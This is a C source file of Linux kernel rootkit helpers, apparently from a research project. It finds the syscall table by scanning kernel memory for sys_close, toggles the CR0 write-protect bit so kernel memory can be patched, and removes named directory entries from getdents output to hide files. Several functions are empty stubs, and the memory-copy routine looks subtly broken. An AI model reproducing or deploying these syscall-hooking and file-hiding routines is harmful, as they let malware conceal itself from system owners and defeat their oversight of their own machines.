/*
Copyright 2016 Gu Zhengxiong <rectigu@gmail.com>

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/


# include <linux/kernel.h>
# include <linux/slab.h>
# include <linux/syscalls.h>

# include "lib/structs.h"


// TODO: Write other implementation.
static unsigned long **
get_sys_call_table_via_entry_SYSCALL_64(void)
{
  return NULL;
}


// TODO: Write other implementation.
static unsigned long **
get_sys_call_table_via_System_map(void)
{
  return NULL;
}


// WARN: This can be cheated.
static unsigned long **
get_sys_call_table_via_sys_close(void)
{
  unsigned long **entry = (unsigned long **)PAGE_OFFSET;

  for (;(unsigned long)entry < ULONG_MAX; entry += 1) {
    if (entry[__NR_close] == (unsigned long *)sys_close) {
        return entry;
      }
  }

  return NULL;
}


// TODO: Handle 32-bit cases.
unsigned long **
get_ia32_sys_call_table(void)
{
  return NULL;
}


unsigned long **
get_sys_call_table(void)
{
  return get_sys_call_table_via_sys_close();
}


// TODO: Consider race condition on SMP systems.
void
disable_write_protection(void)
{
  unsigned long cr0 = read_cr0();
  clear_bit(X86_CR0_WP_BIT, &cr0);
  write_cr0(cr0);
}


// TODO: Consider race condition on SMP systems.
void
enable_write_protection(void)
{
  unsigned long cr0 = read_cr0();
  set_bit(X86_CR0_WP_BIT, &cr0);
  write_cr0(cr0);
}


// TODO: Can we provide these functionality to both user mode and
// kernel land users in a single code base?
char *
join_strings(const char *const *strings, const char *delim,
             char *buff, size_t count)
{
  int index;
  const char *one;

  strlcpy(buff, strings[0], count);

  index = 1;
  one = strings[index];
  while (one) {
    strlcat(buff, delim, count);
    strlcat(buff, one, count);

    index += 1;
    one = strings[index];
  }

  return buff;
}


void
print_memory(void *addr, size_t count, const char *prompt)
{
  const size_t ONE_SIZE = 3;
  char one[ONE_SIZE];
  size_t index;
  char *buff = kmalloc(PAGE_SIZE, GFP_KERNEL);

  if (!buff) {
    pr_alert("%s\n", "kmalloc failed!");
    return; // TODO: Do something else?
  }

  snprintf(one, ONE_SIZE, "%02x", *((unsigned char *)addr));
  strlcpy(buff, one, PAGE_SIZE);

  for (index = 1; index < count; index += 1) {
    if (index && index % 16 == 0) {
      strlcat(buff, "\n", PAGE_SIZE);
    } else {
      strlcat(buff, " ", PAGE_SIZE);
    }

    snprintf(one, ONE_SIZE, "%02x",
             *((unsigned char *)addr + index));
    strlcat(buff, one, PAGE_SIZE);
  }

  pr_alert("%s: %s\n", prompt, buff);

  kfree(buff);

  return;
}


void *
reverse_copy_memory(void *dest, void *from, size_t count)
{
  size_t index;
  u8 *dest_char, *from_char;

  for (index = count; index > 0; index -= 1) {
    dest_char = (u8 *)((unsigned long)dest + index + 1);
    from_char = (u8 *)((unsigned long)from + (count - index));
    *dest_char = *from_char;
  }

  return dest;
}


void
print_dirent(struct linux_dirent *dirp, long total)
{
  char *buff;
  long index;
  struct linux_dirent *cur;

  buff = kmalloc(PAGE_SIZE, GFP_KERNEL);
  if (!buff) {
    return;
  }

  strlcpy(buff, dirp->d_name, PAGE_SIZE);
  index = dirp->d_reclen;
  cur = (struct linux_dirent *)((unsigned long)dirp + index);
  while (index < total) {
    strlcat(buff, " ", PAGE_SIZE);
    strlcat(buff, cur->d_name, PAGE_SIZE);
    index += cur->d_reclen;
    cur = (struct linux_dirent *)((unsigned long)dirp + index);
  }

  pr_alert("%s\n", buff);
  kfree(buff);

  return;
}


long
remove_dirent_entry(char *name,
                    struct linux_dirent *dirp, long total)
{
  struct linux_dirent *cur = dirp;
  long index = 0;

  while (index < total) {
    if (strncmp(cur->d_name, name, strlen(name)) == 0) {
      unsigned long next_rec = (unsigned long)cur + cur->d_reclen;
      long rest = (unsigned long)dirp + total - next_rec;
      long reclen = cur->d_reclen;
      pr_alert("Hiding: %s\n", cur->d_name);
      memmove(cur, (void *)next_rec, rest);
      total -= reclen;
    }
    index += cur->d_reclen;
    cur = (struct linux_dirent *)((unsigned long)dirp + index);
  }

  return total;
}
